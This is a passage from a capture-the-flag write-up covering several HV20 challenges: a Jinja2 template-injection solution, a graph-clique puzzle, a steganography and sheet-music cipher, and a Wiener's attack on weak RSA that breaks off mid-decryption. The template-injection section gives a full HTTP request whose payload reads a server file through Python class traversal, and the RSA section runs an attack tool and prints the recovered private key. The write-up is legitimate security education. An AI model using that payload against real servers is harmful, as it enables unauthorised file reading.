<p>The error was: <code>TemplateSyntaxError: Encountered unknown tag '__import__'.</code></p>
<p>Other (unsuccessful) approaches that I tried out are documented here:</p>
<ul>
<li><a href="https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti">https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti</a></li>
<li><a href="https://jinja2docs.readthedocs.io/en/stable/templates.html?highlight=include#include">https://jinja2docs.readthedocs.io/en/stable/templates.html?highlight=include#include</a></li>
</ul>
<p>Some more web crawling was needed to finally stumble on the following link at Exploit-DB describing a Server-side Template Injection vulnerability: <a href="https://www.exploit-db.com/exploits/46386">https://www.exploit-db.com/exploits/46386</a>.</p>
<p>With that information, I crafted the request hereafter and was able to find the flag:</p>
<pre><code>POST / HTTP/1.1
Host: 283b1812-7b4f-4721-9095-86dd0ebbac0d.idocker.vuln.land
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 83
Origin: https://283b1812-7b4f-4721-9095-86dd0ebbac0d.idocker.vuln.land
Connection: close
Referer: https://283b1812-7b4f-4721-9095-86dd0ebbac0d.idocker.vuln.land/
Upgrade-Insecure-Requests: 1

eyes=*&amp;name={{ &#39;&#39;.__class__.__mro__[2].__subclasses__()[40](&#39;/flag.txt&#39;).read() }}
</code></pre>
<p>The vulnerability exploits the property that each class in python keeps a reference to its superclasses through <code>__mro__</code> and to its subclasses through <code>__subclasses__</code>. This is how one is able to go up to <code>Object</code> from a <code>str</code> object and down again to a <code>file</code> class, which was then used to instantiate a new object and read out the file.</p>
<p>Note however, that this works for Python 2.7. The principle is still valid in Python 3, but indexes are different (and the <code>file</code> class seems not directly available anymore).</p>
<h2 id="flag-8">Flag</h2>
<p><code>HV20{SST1_N0t_0NLY_H1Ts_UB3R!!!}</code></p>
<h2 id="tools-7">Tools</h2>
<ul>
<li>Burpsuite</li>
<li>Firefox</li>
<li>DuckDuckGo</li>
</ul>
<h1 id="hv2010-be-patient-with-the-adjacent">HV20.10 Be patient with the adjacent</h1>
<table>
<thead>
<tr class="header">
<th><!-- --></th>
<th><!-- --></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><strong>Author</strong></td>
<td>Bread</td>
</tr>
<tr class="even">
<td><strong>Level</strong></td>
<td>medium</td>
</tr>
<tr class="odd">
<td><strong>Categories</strong></td>
<td><code>programming</code></td>
</tr>
</tbody>
</table>
<h2 id="description-9">Description</h2>
<p>Ever wondered how Santa delivers presents, and knows which groups of friends should be provided with the best gifts? It should be as great or as large as possible! Well, here is one way.</p>
<p>Hmm, I cannot seem to read the file either, maybe the internet knows?</p>
<p><a href="./7b24b79f-d898-4480-bc1b-e09742f704f7.col.b">Download</a></p>
<h3 id="hints-3">Hints</h3>
<ul>
<li>Hope this cliques for you</li>
<li><code>bin2asc</code> will help you with this, but ...</li>
<li>segfaults can be fixed - maybe read the source</li>
<li>If you are using Windows for this challenge, make sure to add a <code>b</code> to to the <code>fopen</code> calls on lines 37 and 58</li>
<li>There is more than one thing you can do with this type of file! Try other options...</li>
<li>Groups, not group</li>
</ul>
<h2 id="approach-9">Approach</h2>
<p>The given <code>.col.b</code> file has the following header:</p>
<pre><code>284
c -------------------------------- 
c Reminder for Santa:
c   104 118 55 51 123 110 111 116 95 84 72 69 126 70 76 65 71 33 61 40 124 115 48 60 62 83 79 42 82 121 125 45 98 114 101 97 100 are the nicest kids.
c   - bread.
c -------------------------------- 
p edges 18876 439050
</code></pre>
<p>Interpreting the decimal numbers directly and converting them to binary produced the string <code>hv73{not_THE~FLAG!=(|s0&lt;&gt;SO*Ry}-bread</code>. Another "flake" - doh!</p>
<p>As I had to find out first, <code>.col.b</code> files are used to store graphs in a binary <a href="http://prolland.free.fr/works/research/dsat/dimacs.html">DIMACS</a> format. Their sibling is <code>.col</code> which is the same but in an ASCII format.</p>
<p>To convert between the two formats, the program <code>bin2asc</code> (found <a href="https://mat.gsia.cmu.edu/COLOR/format/binformat.shar">here</a> or <a href="http://archive.dimacs.rutgers.edu/pub/challenge/graph/translators/binformat/NotANSI/">here</a>) had to be compiled.</p>
<p>However, <code>bin2asc</code> crashed... As we had 18876 vertices and 439050 edges, the problem apparently was that the max number of allowed vertices (5000) was lower than the number of edges in our source file. So, the limit had to be raised in the file <code>genbin.h</code>.</p>
<p>Next, we apparently had to form <a href="https://en.wikipedia.org/wiki/Clique_(graph_theory)">cliques</a> in our graph.</p>
<p>This was done using the python library <code>networkx</code> (see <a href="https://networkx.org/documentation/stable/reference/algorithms/clique.html">https://networkx.org/documentation/stable/reference/algorithms/clique.html</a>).</p>
<p>Long story short, for each of the nice kids, we had to find the size of the largest clique they belong to, convert that size into a character, which then formed the flag.</p>
<div class="sourceCode" id="cb21"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb21-1"><a href="#cb21-1"></a><span class="co">#!/usr/bin/env python</span></span>
<span id="cb21-2"><a href="#cb21-2"></a></span>
<span id="cb21-3"><a href="#cb21-3"></a><span class="im">import</span> networkx <span class="im">as</span> nx</span>
<span id="cb21-4"><a href="#cb21-4"></a><span class="im">from</span> networkx.algorithms <span class="im">import</span> clique</span>
<span id="cb21-5"><a href="#cb21-5"></a></span>
<span id="cb21-6"><a href="#cb21-6"></a>g <span class="op">=</span> nx.Graph()</span>
<span id="cb21-7"><a href="#cb21-7"></a><span class="cf">with</span> <span class="bu">open</span>(<span class="st">&quot;./7b24b79f-d898-4480-bc1b-e09742f704f7_mod.col&quot;</span>, <span class="st">&quot;r&quot;</span>) <span class="im">as</span> f:</span>
<span id="cb21-8"><a href="#cb21-8"></a>    <span class="cf">for</span> l <span class="kw">in</span> f:</span>
<span id="cb21-9"><a href="#cb21-9"></a>        <span class="cf">if</span> l[<span class="dv">0</span>] <span class="op">==</span> <span class="st">&#39;e&#39;</span>:</span>
<span id="cb21-10"><a href="#cb21-10"></a>            _, a, b <span class="op">=</span> l.split(<span class="st">&#39; &#39;</span>, <span class="dv">2</span>)</span>
<span id="cb21-11"><a href="#cb21-11"></a>            g.add_edge(<span class="bu">int</span>(a), <span class="bu">int</span>(b))</span>
<span id="cb21-12"><a href="#cb21-12"></a></span>
<span id="cb21-13"><a href="#cb21-13"></a>cliques <span class="op">=</span> clique.find_cliques(g)</span>
<span id="cb21-14"><a href="#cb21-14"></a>kids<span class="op">=</span>[<span class="dv">104</span>,<span class="dv">118</span>,<span class="dv">55</span>,<span class="dv">51</span>,<span class="dv">123</span>,<span class="dv">110</span>,<span class="dv">111</span>,<span class="dv">116</span>,<span class="dv">95</span>,<span class="dv">84</span>,<span class="dv">72</span>,<span class="dv">69</span>,<span class="dv">126</span>,<span class="dv">70</span>,<span class="dv">76</span>,<span class="dv">65</span>,<span class="dv">71</span>,<span class="dv">33</span>,<span class="dv">61</span>,<span class="dv">40</span>,<span class="dv">124</span>,<span class="dv">115</span>,<span class="dv">48</span>,<span class="dv">60</span>,<span class="dv">62</span>,<span class="dv">83</span>,<span class="dv">79</span>,<span class="dv">42</span>,<span class="dv">82</span>,<span class="dv">121</span>,<span class="dv">125</span>,<span class="dv">45</span>,<span class="dv">98</span>,<span class="dv">114</span>,<span class="dv">101</span>,<span class="dv">97</span>,<span class="dv">100</span>]</span>
<span id="cb21-15"><a href="#cb21-15"></a>matching_cliques<span class="op">=</span><span class="dv">0</span></span>
<span id="cb21-16"><a href="#cb21-16"></a></span>
<span id="cb21-17"><a href="#cb21-17"></a>cliques_per_kid <span class="op">=</span> {}</span>
<span id="cb21-18"><a href="#cb21-18"></a></span>
<span id="cb21-19"><a href="#cb21-19"></a><span class="co"># Find all cliques for each kid.</span></span>
<span id="cb21-20"><a href="#cb21-20"></a><span class="cf">for</span> clique <span class="kw">in</span> cliques:</span>
<span id="cb21-21"><a href="#cb21-21"></a>    inters <span class="op">=</span> <span class="bu">set</span>(kids).intersection(<span class="bu">set</span>(clique))</span>
<span id="cb21-22"><a href="#cb21-22"></a>    <span class="cf">if</span> <span class="bu">len</span>(inters) <span class="op">&gt;</span> <span class="dv">0</span>:</span>
<span id="cb21-23"><a href="#cb21-23"></a>        <span class="cf">for</span> i <span class="kw">in</span> inters:</span>
<span id="cb21-24"><a href="#cb21-24"></a>            <span class="cf">if</span> i <span class="kw">not</span> <span class="kw">in</span> cliques_per_kid:</span>
<span id="cb21-25"><a href="#cb21-25"></a>                kid_cliques <span class="op">=</span> <span class="bu">list</span>()</span>
<span id="cb21-26"><a href="#cb21-26"></a>            <span class="cf">else</span>:</span>
<span id="cb21-27"><a href="#cb21-27"></a>                kid_cliques <span class="op">=</span> cliques_per_kid[i]</span>
<span id="cb21-28"><a href="#cb21-28"></a>            <span class="cf">if</span> <span class="bu">len</span>(clique) <span class="op">&gt;</span> <span class="dv">2</span>:</span>
<span id="cb21-29"><a href="#cb21-29"></a>                kid_cliques.append(clique)</span>
<span id="cb21-30"><a href="#cb21-30"></a>            cliques_per_kid[i] <span class="op">=</span> kid_cliques</span>
<span id="cb21-31"><a href="#cb21-31"></a></span>
<span id="cb21-32"><a href="#cb21-32"></a><span class="co"># For each kid, find the largest clique it belongs to.</span></span>
<span id="cb21-33"><a href="#cb21-33"></a><span class="cf">for</span> kid <span class="kw">in</span> kids:</span>
<span id="cb21-34"><a href="#cb21-34"></a>    clickes <span class="op">=</span> cliques_per_kid[kid]</span>
<span id="cb21-35"><a href="#cb21-35"></a>    largest_clique <span class="op">=</span> <span class="dv">0</span></span>
<span id="cb21-36"><a href="#cb21-36"></a>    <span class="cf">for</span> clique <span class="kw">in</span> clickes:</span>
<span id="cb21-37"><a href="#cb21-37"></a>        clique_size <span class="op">=</span> <span class="bu">len</span>(clique)</span>
<span id="cb21-38"><a href="#cb21-38"></a>        largest_clique <span class="op">=</span> clique_size <span class="cf">if</span> clique_size <span class="op">&gt;</span> largest_clique <span class="cf">else</span> largest_clique</span>
<span id="cb21-39"><a href="#cb21-39"></a>    <span class="bu">print</span>(<span class="bu">chr</span>(largest_clique), end<span class="op">=</span><span class="st">&#39;&#39;</span>)</span>
<span id="cb21-40"><a href="#cb21-40"></a><span class="bu">print</span>()</span></code></pre></div>
<h2 id="flag-9">Flag</h2>
<p><code>HV20{Max1mal_Cl1qu3_Enum3r@t10n_Fun!}</code></p>
<h2 id="credits-1">Credits</h2>
<p>Thanks to <span class="emoji" data-emoji="bread">üçû</span> for keeping me on track, when I almost gave up - and for extending the deadline for flag submission ;).</p>
<h1 id="hv2011-chrismas-carol">HV20.11 Chris'mas carol</h1>
<table>
<thead>
<tr class="header">
<th><!-- --></th>
<th><!-- --></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><strong>Author</strong></td>
<td>Chris</td>
</tr>
<tr class="even">
<td><strong>Level</strong></td>
<td>medium</td>
</tr>
<tr class="odd">
<td><strong>Categories</strong></td>
<td><code>crypto</code>, <code>forensic</code></td>
</tr>
</tbody>
</table>
<h2 id="description-10">Description</h2>
<p>Since yesterday's challenge seems to have been a bit on the hard side, we're adding a small musical innuendo to relax.</p>
<p>My friend Chris from Florida sent me this score. Enjoy! Is this what you call postmodern?</p>
<p><img src="./2e571ba0-57a5-435b-a992-5f02546f9e90.png" alt="Christmas carol" /></p>
<p>P.S: Also, we're giving another 24h to get full points for the last challenge.</p>
<h3 id="hints-4">Hints</h3>
<p>He also sent <a href="./f3d66342-bdbc-4fe6-859a-385300057e07.png">this image</a>, but that doesn't look like Miami's skyline to me. The secret code is useful for a file - not a website</p>
<h2 id="approach-10">Approach</h2>
<p>Since I'm not really a musician, I started off with the hints. Using Google Image search, one finds out quickly that the image in the hints shows Hong-Kong, rather than Miami - but how does this help us?</p>
<p>Only on a second look, I discovered the link to a steganography page at <a href="https://www.mobilefish.com/services/steganography/steganography.php">https://www.mobilefish.com/services/steganography/steganography.php</a></p>
<p>It seemed clear that the sheet music image had to be uploaded there to extract some information - but what was the password to be used? It turns out, there wasn't any password for that step. One only had to overcome the especially bad UX of mobilefish.com and scroll down enough to discover the now uncovered file called <code>flag.zip</code>.</p>
<p><img src="./bad_mobilefish_ux.png" alt="Bad UX" /></p>
<p>The resulting zip file, however, was password protected.</p>
<p>At that point, I feared I still had to interprete the sheet music somehow - which turned out to be right. The music, however, was special. Signs for this was the 16/16 rythm and the small <code>0x</code> signs, which I've never seen on sheet music before.</p>
<p>I started reading the music using and interpretion help <a href="https://de.wikihow.com/Musiknoten-lesen">https://de.wikihow.com/Musiknoten-lesen</a>. The result did only use sounds between A-F, never G, which confirmed its special nature. The result did not make sense yet, though.</p>
<p>The missing part were the octaves. Using <a href="https://en.wikipedia.org/wiki/Scientific_pitch_notation">https://en.wikipedia.org/wiki/Scientific_pitch_notation</a> I added numbers, so I ended up with hex numbers:</p>
<pre><code>e3 b4 f4 e3 d3 e2 d3 a5 b5 d5 a2 e5 a5 e3 a3
b3 e3 d5 d3 a3 d1 a1 c4 e3 e4 d1 d4 d1 d3 d1
</code></pre>
<p>After XORing the two, the following string was the result: <code>PW!0p3raV1s1t0r</code></p>
<p>With that string, the zip file found earlier was extractable and the flag could be found in <code>flag.txt</code>.</p>
<p>To conclude this challenge, it is still not entirely clear to me how mobilefish.com embeds the information into pngs and whether that information can be extracted using another tool than mobilefish.com.</p>
<h2 id="flag-10">Flag</h2>
<p><code>HV20{r3ad-th3-mus1c!}</code></p>
<h2 id="credits-2">Credits</h2>
<p>Thanks to mcia for helping out and keeping me on the right track, when I almost let myself fool by the bad Mobilefish UX, which made it easy to not see that there was in fact a result...</p>
<h1 id="hv2012-wiener-waltz">HV20.12 Wiener waltz</h1>
<table>
<thead>
<tr class="header">
<th><!-- --></th>
<th><!-- --></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><strong>Author</strong></td>
<td>SmartSmurf</td>
</tr>
<tr class="even">
<td><strong>Level</strong></td>
<td>medium</td>
</tr>
<tr class="odd">
<td><strong>Categories</strong></td>
<td><code>crypto</code></td>
</tr>
</tbody>
</table>
<h2 id="description-11">Description</h2>
<h3 id="introduction-2">Introduction</h3>
<p>During their yearly season opening party our super-smart elves developed an improved usage of the well known RSA crypto algorithm. Under the "Green IT" initiative they decided to save computing horsepower (or rather reindeer power?) on their side. To achieve this they chose a pretty large private exponent around 1/4 size of modulus - impossible to guess. The reduction of 75% should save a lot of computing effort while still being safe. Shouldn't it?</p>
<h3 id="mission">Mission</h3>
<p>Your SIGINT team captured some communication containing key exchange and encrypted data. Can you recover the original message?</p>
<p><a href="./b7307460-be03-45be-bd9f-b404b48e62c9.pcap">Download</a></p>
<h3 id="hints-5">Hints</h3>
<p>Don't waste time with the attempt to brute-force the private key</p>
<h2 id="approach-11">Approach</h2>
<ul>
<li>Skim through the pcap and discard traffic on port 443 as it's encrypted and there seems to be no key exchange.</li>
<li>Find that there's something going on on port 7711</li>
<li>Read that traffic and find a modulus n and an e in packet 1952:</li>
</ul>
<pre><code>{
    &quot;pubkey&quot;: {
        &quot;n&quot;: &quot;dbn25TSjDhUge4L68AYooIqwo0HC2mIYxK/ICnc+8/0fZi1CHo/QwiPCcHM94jYdfj3PIQFTri9j/za3oO+3gVK39bj2O9OekGPG2M1GtN0Sp+ltellLl1oV+TBpgGyDt8vcCAR1B6shOJbjPAFqL8iTaW1C4KyGDVQhQrfkXtAdYv3ZaHcV8tC4ztgA4euP9o1q+kZux0fTv31kJSE7K1iJDpGfy1HiJ5gOX5T9fEyzSR0kA3sk3a35qTuUU1OWkH5MqysLVKZXiGcStNErlaggvJb6oKkx1dr9nYbqFxaQHev0EFX4EVfPqQzEzesa9ZAZTtxbwgcV9ZmTp25MZg==&quot;,
        &quot;e&quot;: &quot;S/0OzzzDRdsps+I85tNi4d1i3d0Eu8pimcP5SBaqTeBzcADturDYHk1QuoqdTtwX9XY1Wii6AnySpEQ9eUEETYQkTRpq9rBggIkmuFnLygujFT+SI3Z+HLDfMWlBxaPW3Exo5Yqqrzdx4Zze1dqFNC5jJRVEJByd7c6+wqiTnS4dR77mnFaPHt/9IuMhigVisptxPLJ+g9QX4ZJX8ucU6GPSVzzTmwlDIjaenh7L0bC1Uq/euTDUJjzNWnMpHLHnSz2vgxLg4Ztwi91dOpO7KjvdZQ7++nlHRE6zlMHTsnPFSwLwG1ZxnGVdFnuMjEbPA3dcTe54LxOSb2cvZKDZqA==&quot;,
        &quot;format&quot;: [
            &quot;mpz_export&quot;,
            -1, //order (least significant word first)
            4, // size (word size)
            1, // endian (most significant byte first)
            0 // nail
        ]
    },
    &quot;sessionId&quot;: &quot;RmERqOnbsA/oua67sID4Eg==&quot;
}
</code></pre>
<ul>
<li>Subsequent packets (starting at 1956) apparently contain encrypted data (re-ordered by <code>blockId</code>):</li>
</ul>
<pre><code>{&quot;sessionId&quot;: &quot;RmERqOnbsA/oua67sID4Eg==&quot;, 
&quot;blockId&quot;: 0, 
&quot;data&quot;: &quot;fJdSIoC9qz27pWVpkXTIdJPuR9Fidfkq1IJPRQdnTM2XmhrcZToycoEoqJy91BxikRXQtioFKbS7Eun7oVS0yw==&quot;, &quot;format&quot;: &quot;plain&quot;}

{&quot;sessionId&quot;: &quot;RmERqOnbsA/oua67sID4Eg==&quot;, &quot;blockId&quot;: 1, &quot;data&quot;: &quot;vzwheJ3akhr1LJTFzmFxdhBgViykRpUldFyU6qTu5cjxd1fOM3xkn49GYEM+2cUVk22Tu5IsYDbzJ4/zSDfzKA==&quot;, &quot;format&quot;: &quot;plain&quot;}

{&quot;sessionId&quot;: &quot;RmERqOnbsA/oua67sID4Eg==&quot;, &quot;blockId&quot;: 2, &quot;data&quot;: &quot;fRYUyYEINA5i/hCsEtKkaCn2HsCp98+ksi/8lw1HNTP+KFyjwh2gZH+nkzLwI+fdJFbCN5iwFFXo+OzgcEMFqw==&quot;, &quot;format&quot;: &quot;plain&quot;}

{&quot;sessionId&quot;: &quot;RmERqOnbsA/oua67sID4Eg==&quot;, &quot;blockId&quot;: 3, &quot;data&quot;: &quot;+y2fMsE0u2F6bp2VP27EaLN68uj2CXm9J1WVFyLgqeQryh5jMyryLwuJNo/pz4tXzRqV4a8gM0JGdjvF84mf+w==&quot;, &quot;format&quot;: &quot;plain&quot;}
</code></pre>
<ul>
<li><p>n and e represent the public key. Luckily, there's also a format description. Searching for <code>mpz_export</code> leads to <a href="https://gmplib.org/manual/Integer-Import-and-Export">https://gmplib.org/manual/Integer-Import-and-Export</a>, which explains also the following parameters:</p>
<ul>
<li>order = -1: least significant word first (i.e. we have to reverse the order of words)</li>
<li>size = 4: size in bytes of a word</li>
<li>endian = 1: most significant byte first</li>
<li>nail = 0: no impact (I believe)</li>
</ul></li>
<li><p>As we want to decrypt the ciphered message, which is encrypted using the RSA public key, we need to find the private key first. But how? I would have searched for this a longer time, if there wasn't the challenge title "Wiener waltz". Searching for "RSA attacks" leads to <a href="https://en.wikipedia.org/wiki/Coppersmith%27s_attack">"Coppersmith's attack"</a>, which references <a href="https://en.wikipedia.org/wiki/Wiener%27s_attack">"Wiener's attack"</a>. Alternatively, one could also search for "Wiener crypto".</p></li>
<li><p>Apparently, choosing a small private key <code>d</code> was not so smart by the elves.</p></li>
<li><p>Searching for a tool, I landed at <a href="https://github.com/Ganapati/RsaCtfTool">https://github.com/Ganapati/RsaCtfTool</a>, which seems to implement the wanted attack.</p></li>
<li><p>RsaCtfTool however turned out to have a picky interface, so that the output had to be verified each time.</p></li>
<li><p>Running the following command produced the private key:</p></li>
</ul>
<div class="sourceCode" id="cb25"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb25-1"><a href="#cb25-1"></a><span class="ex">./RsaCtfTool.py</span> -n 0xa76e4c6615f59993dc5bc207f590194ec4cdeb1a57cfa90c1055f811901debf486ea1716d5dafd9dfaa0a931a820bc96b4d12b95578867122b0b54a6907e4cab94535396adf9a93b037b24ddb3491d2494fd7c4c27980e5f9fcb51e258890e9125213b2bd3bf7d64466ec747f68d6afa00e1eb8fd0b8ced8687715f21d62fdd9b7e45ed00d54214242e0ac86c893696d3c016a2f213896e3047507abb7cbdc0869806c835a15f9307a594b9712a7e96dcd46b4dd9063c6d8f63bd39e52b7f5b8a0efb78163ff36b70153ae2f7e3dcf213de2361d23c270731e8fd0c21f662d42773ef3fdc4afc80ac2da62188ab0a341f00628a0207b82fa34a30e1575b9f6e5 -e 0x64a0d9a8926f672fee782f1303775c4d8c8c46cf655d167b1b56719cc54b02f0c1d3b273444eb394fefa79473bdd650e3a93bb2a708bdd5d12e0e19b4b3daf83291cb1e73ccd5a73b930d426b552afde1ecbd1b022369e9ed39b094363d2573cf2e714e817e19257b27e83d4b29b713c218a0562dffd22e39c568f1e1d47bee6a8939d2eedcebec244241c9d2e632515d5da853471e19cde8aaaaf37dc4c68e541c5a3d6b0df316923767e1ca3153f9259cbca0b808926b86af6b06084244d1a7941044d92a4443d28ba027cf576355a9d4edc174d50ba8abab0d81e737000ed16aa4de099c3f94804bbca62dd62dddde6d362e129b3e23c3cc345db4bfd0ecf --attack wiener --private</span>
<span id="cb25-2"><a href="#cb25-2"></a></span>
<span id="cb25-3"><a href="#cb25-3"></a>[<span class="ex">*</span>] Testing key /tmp/tmpzuq4981n.</span>
<span id="cb25-4"><a href="#cb25-4"></a>[<span class="ex">*</span>] Performing wiener attack on /tmp/tmpzuq4981n.</span>
<span id="cb25-5"><a href="#cb25-5"></a></span>
<span id="cb25-6"><a href="#cb25-6"></a><span class="ex">Results</span> for /tmp/tmpzuq4981n:</span>
<span id="cb25-7"><a href="#cb25-7"></a></span>
<span id="cb25-8"><a href="#cb25-8"></a><span class="ex">Private</span> key :</span>
<span id="cb25-9"><a href="#cb25-9"></a><span class="ex">-----BEGIN</span> RSA PRIVATE KEY-----</span>
<span id="cb25-10"><a href="#cb25-10"></a><span class="ex">MIIEXQIBAAKCAQEAp25MZhX1mZPcW8IH9ZAZTsTN6xpXz6kMEFX4EZAd6/SG6hcW</span></span>
<span id="cb25-11"><a href="#cb25-11"></a><span class="ex">1dr9nfqgqTGoILyWtNErlVeIZxIrC1SmkH5Mq5RTU5at+ak7A3sk3bNJHSSU/XxM</span></span>
<span id="cb25-12"><a href="#cb25-12"></a><span class="ex">J5gOX5/LUeJYiQ6RJSE7K9O/fWRGbsdH9o1q+gDh64/QuM7YaHcV8h1i/dm35F7Q</span></span>
<span id="cb25-13"><a href="#cb25-13"></a><span class="ex">DVQhQkLgrIbIk2ltPAFqLyE4luMEdQert8vcCGmAbINaFfkwellLlxKn6W3NRrTd</span></span>
<span id="cb25-14"><a href="#cb25-14"></a><span class="ex">kGPG2PY7055St/W4oO+3gWP/NrcBU64vfj3PIT3iNh0jwnBzHo/Qwh9mLUJ3PvP9</span></span>
<span id="cb25-15"><a href="#cb25-15"></a><span class="ex">xK/ICsLaYhiKsKNB8AYooCB7gvo0ow4Vdbn25QKCAQBkoNmokm9nL+54LxMDd1xN</span></span>
<span id="cb25-16"><a href="#cb25-16"></a><span class="ex">jIxGz2VdFnsbVnGcxUsC8MHTsnNETrOU/vp5RzvdZQ46k7sqcIvdXRLg4ZtLPa+D</span></span>
<span id="cb25-17"><a href="#cb25-17"></a><span class="ex">KRyx5zzNWnO5MNQmtVKv3h7L0bAiNp6e05sJQ2PSVzzy5xToF+GSV7J+g9Sym3E8</span></span>
<span id="cb25-18"><a href="#cb25-18"></a><span class="ex">IYoFYt/9IuOcVo8eHUe+5qiTnS7tzr7CRCQcnS5jJRXV2oU0ceGc3oqqrzfcTGjl</span></span>
<span id="cb25-19"><a href="#cb25-19"></a><span class="ex">QcWj1rDfMWkjdn4coxU/klnLyguAiSa4avawYIQkTRp5QQRNkqREPSi6Anz1djVa</span></span>
<span id="cb25-20"><a href="#cb25-20"></a><span class="ex">nU7cF01Quoq6sNgec3AA7RaqTeCZw/lIBLvKYt1i3d3m02LhKbPiPDzDRdtL/Q7P</span></span>
<span id="cb25-21"><a href="#cb25-21"></a><span class="ex">AkB7dSuT4jDODSTwTjIp+fBefNg8SeSdShdPLILytYNJtwNDeDJb0Ye7QfSWWBMD</span></span>
<span id="cb25-22"><a href="#cb25-22"></a><span class="ex">bI+NMT9MMq7XeTXO8zgA4aIvAoGBALlCNJVmKy1SZAHzv1yAx78vOH+lpfM6oteo</span></span>
<span id="cb25-23"><a href="#cb25-23"></a><span class="ex">mR0QQVD/iJLsKBfecK/nSTS1XKbIYBmr3VPv4bcxV3VlSGqFJmRgF2gekzsm6fK4</span></span>
<span id="cb25-24"><a href="#cb25-24"></a><span class="ex">Z0z3XBbJkvUUHTjM7XsbcmFJBYsYiCumrybzv7wjhu1CrSwYt8A/Imt8HltcrXZz</span></span>
<span id="cb25-25"><a href="#cb25-25"></a><span class="ex">cfLo2g4dAoGBAOddWxAVpWghi00EAvWoVss9UcbcAYergX0Gv+zYUv9jClIFvGgT</span></span>
<span id="cb25-26"><a href="#cb25-26"></a><span class="ex">Bmo5WZ3lpQCDRfdb4mMhd7IIALGhMPB2QPyhjoeMAgiq4wnewRgUxB2SZ+wKCc3M</span></span>
<span id="cb25-27"><a href="#cb25-27"></a><span class="ex">PqL4iy7ZQGsrQO60MU8OxRFk8AAhTW8QYEdcszln5AdZccS5RTOQr1FpAkB7dSuT</span></span>
<span id="cb25-28"><a href="#cb25-28"></a><span class="ex">4jDODSTwTjIp+fBefNg8SeSdShdPLILytYNJtwNDeDJb0Ye7QfSWWBMDbI+NMT9M</span></span>
<span id="cb25-29"><a href="#cb25-29"></a><span class="ex">Mq7XeTXO8zgA4aIvAkB7dSuT4jDODSTwTjIp+fBefNg8SeSdShdPLILytYNJtwND</span></span>
<span id="cb25-30"><a href="#cb25-30"></a><span class="ex">eDJb0Ye7QfSWWBMDbI+NMT9MMq7XeTXO8zgA4aIvAoGAK1AN3Npry6/Ua0BwkQy6</span></span>
<span id="cb25-31"><a href="#cb25-31"></a><span class="ex">hpcOshnf4viahNoOXswzeD90TV1hU8G4DVnz8r3fp3chBJWcnscYViJkehMwdJo+</span></span>
<span id="cb25-32"><a href="#cb25-32"></a><span class="ex">LMMwRuYos0iHraTT0BJATxlcN14BreOnvAqI32L2L24ij0er64Ukj647DTJiQ1AD</span></span>
<span id="cb25-33"><a href="#cb25-33"></a><span class="va">QguWrpROv9OLIJXfGNf9BEA=</span></span>
<span id="cb25-34"><a href="#cb25-34"></a><span class="ex">-----END</span> RSA PRIVATE KEY-----</span></code></pre></div>
<ul>
<li>Decoding the data to be decrypted:</li>
</ul>
<div class="sourceCode" id="cb26"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb26-1"><a href="#cb26-1"></a><span class="bu">echo</span> <span class="st">&quot;fJdSIoC9qz27pWVpkXTIdJPuR9Fidfkq1IJPRQdnTM2XmhrcZToycoEoqJy91BxikRXQtioFKbS7Eun7oVS0yw==\</span></span>
<span id="cb26-2"><a href="#cb26-2"></a><span class="st">vzwheJ3akhr1LJTFzmFxdhBgViykRpUldFyU6qTu5cjxd1fOM3xkn49GYEM+2cUVk22Tu5IsYDbzJ4/zSDfzKA==\</span></span>
<span id="cb26-3"><a href="#cb26-3"></a><span class="st">fRYUyYEINA5i/hCsEtKkaCn2HsCp98+ksi/8lw1HNTP+KFyjwh2gZH+nkzLwI+fdJFbCN5iwFFXo+OzgcEMFqw==\</span></span>
<span id="cb26-4"><a href="#cb26-4"></a><span class="st">+y2fMsE0u2F6bp2VP27EaLN68uj2CXm9J1WVFyLgqeQryh5jMyryLwuJNo/pz4tXzRqV4a8gM0JGdjvF84mf+w==&quot;</span> <span class="kw">|</span> <span class="ex">base64</span> -d <span class="op">&gt;</span> ../data_enc.dat</span></code></pre></div>
<ul>
<li>And decrypting the data:</li>
</ul>
<div class="sourceCode" id="cb27"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb27-1"><a href="#cb27-1"></a>$ <span class="ex">./RsaCtfTool.py</span> -n 0xa76e4c6615f59993dc5bc207f590194ec4cdeb1a57cfa90c1055f811901debf486ea1716d5dafd9dfaa0a931a820bc96b4d12b95578867122b0b54a6907e4cab94535396adf9a93b037b24ddb3491d2494fd7c4c27980e5f9fcb51e258890e9125213b2bd3bf7d64466ec747f68d6afa00e1eb8fd0b8ced8687715f21d62fdd9b7e45ed00d54214242e0ac86c893696d3c016a2f213896e3047507abb7cbdc0869806c835a15f9307a594b9712a7e96dcd46b4dd9063c6d8f63bd39e52b7f5b8a0efb78163ff36b70153ae2f7e3dcf213de2361d23c270731e8fd0c21f662d42773ef3fdc4afc80ac2da62188ab0a341f00628a0207b82fa34a30e1575b9f6e5 -e 0x64a0d9a8926f672fee782f1303775c4d8c8c46cf655d167b1b56719cc54b02f0c1d3b273444eb394fefa79473bdd650e3a93bb2a708bdd5d12e0e19b4b3daf83291cb1e73ccd5a73b930d426b552afde1ecbd1b022369e9ed39b094363d2573cf2e714e817e19257b27e83d4b29b713c218a0562dffd22e39c568f1e1d47bee6a8939d2eedcebec244241c9d2e632515d5da853471e19cde8aaaaf37dc4c68e541c5a3d6b0df316923767e1ca3153f9259cbca0b808926b86af6b06084244d1a7941044d92a4443d28ba027cf576355a9d4edc174d50ba8abab0d81e737000ed16aa4de099c3f94804bbca62dd62dddde6d362e129b3e23c3cc345db4bfd0ecf --attack wiener --uncipherfile ../data_enc.dat --output out.txt</span>
<span id="cb27-2"><a href="#cb27-2"></a></span>
<span id="cb27-3"><a href="#cb27-3"></a>[<span class="ex">...</span>]</span>
<span id="cb27-4"><a href="#cb27-4"></a></span>
